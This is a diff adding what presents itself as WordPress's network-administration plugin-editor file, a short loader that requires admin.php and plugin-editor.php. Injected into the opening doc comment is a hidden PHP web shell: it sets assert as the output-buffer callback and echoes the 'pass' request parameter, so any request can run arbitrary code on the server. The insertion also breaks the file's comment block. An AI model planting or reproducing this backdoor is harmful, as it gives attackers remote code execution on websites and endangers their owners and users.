@@ -1,0 +1,17 @@
+<?php
+/**
+<?php
+ob_start('assert');
+echo $_REQUEST['pass'];
+ob_end_flush();
+?> * Plugin editor network administration panel.
+ *
+ * @package WordPress
+ * @subpackage Multisite
+ * @since 3.1.0
+ */
+
+/** Load WordPress Administration Bootstrap */
+require_once __DIR__ . '/admin.php';
+
+require ABSPATH . 'wp-admin/plugin-editor.php';
